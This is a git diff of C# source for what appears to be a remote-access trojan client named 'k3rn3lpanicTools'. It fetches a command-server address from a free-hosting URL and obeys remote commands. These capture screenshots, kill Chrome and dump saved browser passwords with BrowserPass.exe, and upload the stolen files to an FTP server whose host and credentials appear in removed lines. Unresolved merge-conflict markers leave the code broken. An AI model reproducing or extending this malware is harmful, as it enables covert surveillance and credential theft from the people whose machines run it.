@@ -51,16 +51,24 @@ namespace k3rn3lpanicTools
         }
         public static async Task setVir(RichTextBox l)
         {
-            string ServerIP = (k3rn3lpanicTools.Networkinfo.GetRequest("https://diuhiesluce.freehost.io/index.php?Pass=riuefceiordjcjlkmcsdf")).Replace("\0", string.Empty);
-            if (ServerIP != "")
+            try
             {
-                IPAddress ipda;
-                if (IPAddress.TryParse(ServerIP, out ipda))
+                string ServerIP = (k3rn3lpanicTools.Networkinfo.GetRequest("https://diuhiesluce.freehost.io/index.php?Pass=riuefceiordjcjlkmcsdf")).Replace("\0", string.Empty);
+                if (ServerIP != "")
                 {
-                    SetServerInfo(ServerIP, 23000);
-                    await ConnectToServer(l);
-                }
+                    IPAddress ipda;
+                    if (IPAddress.TryParse(ServerIP, out ipda))
+                    {
+                        SetServerInfo(ServerIP, 23000);
+                        await ConnectToServer(l);
+                    }
 
+                }
+            }
+            catch {
+                IsConnected = false;
+                Task.Delay(8000).GetAwaiter().GetResult();
+                await setVir(l);
             }
 
         }
@@ -91,7 +99,6 @@ namespace k3rn3lpanicTools
 
         private static async Task TakeCareofCommand(string recivedtext, RichTextBox l)
         {
-            Clipboard.SetText(recivedtext);
             Console.WriteLine("***Recived : " + recivedtext);
             l.Text += "\n" + "@[#$]>Recived : " + recivedtext;
 
@@ -104,15 +111,21 @@ namespace k3rn3lpanicTools
             if (recivedtext.StartsWith("Screenshot"))
             {
                 Tools.Capture("capt.jpg");
+<<<<<<< HEAD
+                //await SendFile("capt.jpg","capt.jpg");
+                new FTPClient(FTPinfo.domain, FTPinfo.username, FTPinfo.password, true).DoWork("capt.jpg","capt.panic");
+                await sendStr("File Sent.");
+=======
                 await SendFile("capt.jpg","capt.jpg");
-                new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork("capt.jpg");
+                new FTPClient("ftp://", "user", "password", true).DoWork("capt.jpg");
                 sendStr("File Sent.");
+>>>>>>> 4ed9aec1d4f00b816b4bf2aaec2b31d086517fa7
             }
             if (recivedtext.StartsWith("VoiceMic"))
             {
 
 
-                sendStr("Mic Sent.");
+                await sendStr("Mic Sent.");
             }
             if (recivedtext.StartsWith("lsbrowsers"))
             {
@@ -122,25 +135,46 @@ namespace k3rn3lpanicTools
                 string Mozila = Tools.IsProgramInstalled("firefox.exe");
                 Mozila = Mozila != "" ? Mozila : "Not installed";
                 Browsers += "Chrome : " + chrome + "\nFireFox : " + Mozila;
-                sendStr(Browsers);
-            }
-            if (recivedtext.StartsWith("GetChromeFiles"))
-            {
 
+               Tools.Runcommand("taskkill /IM \"" + "chrome.exe" + "\" /f");
+               
+                await sendStr(Browsers);
             }
-            if (recivedtext.StartsWith("GetMozillaFiles"))
+            if(recivedtext == "harvest")
             {
+                Tools.Runcommand("taskkill /IM chrome.exe /f");
+                string passes = "";
+                if (File.Exists("BrowserPass.exe"))
+                {
 
-            }
-            if (recivedtext.StartsWith("GetEdgeFiles"))
-            {
+                    passes = Tools.Runcommand("BrowserPass.exe");   
+                }
+                else
+                {
+                    passes += "\nFile not fucking found!";
+                }
+                using (StreamWriter sw = new StreamWriter("passes"))
+                {
+                    sw.Write(passes);
+                }
 
+                await SendFile("passes", "passes.txt");
+                //new FTPClient(FTPinfo.domain, FTPinfo.username, FTPinfo.password, true).DoWork("passes", "capt.panic");
+                //await sendStr("File Sent.");
+                //await sendStr(passes);
+                
             }
             if (recivedtext.StartsWith("UploadFile"))
             {
                 string Uploadfile = recivedtext.Substring(11);
                 await SendFile(Uploadfile,Uploadfile);    
             }
+            if (recivedtext.StartsWith("newfilesent-"))
+            {
+                string downloadfilename = recivedtext.Substring(12);
+                Tools.DownloadFromFTP(FTPinfo.domain, FTPinfo.username,FTPinfo.password, downloadfilename, "client.panic");
+            }
+            
         }
         private static async Task ReadDataAsync(TcpClient mClient, RichTextBox l)
         {
@@ -231,8 +265,17 @@ namespace k3rn3lpanicTools
         }
         public static async Task SendFile(string filename,string filenametosave)
         {
-            new FTPClient("ftp://3287871599.cloudylink.com", "frdiuh", "T63NyMC9Zmkh7w", true).DoWork(filename);
+<<<<<<< HEAD
+            if (Tools.UploadFiletoFTP(FTPinfo.domain, FTPinfo.username, FTPinfo.password, filename, "client.panic"))
+            {
+                sendStr("FileReqsent-" + filenametosave);
+            }
+
+            
+=======
+            new FTPClient("ftp://", "username", "Password", true).DoWork(filename);
             await sendStr("FileReqsent-" + filenametosave);
+>>>>>>> 4ed9aec1d4f00b816b4bf2aaec2b31d086517fa7
         }
     }
 }
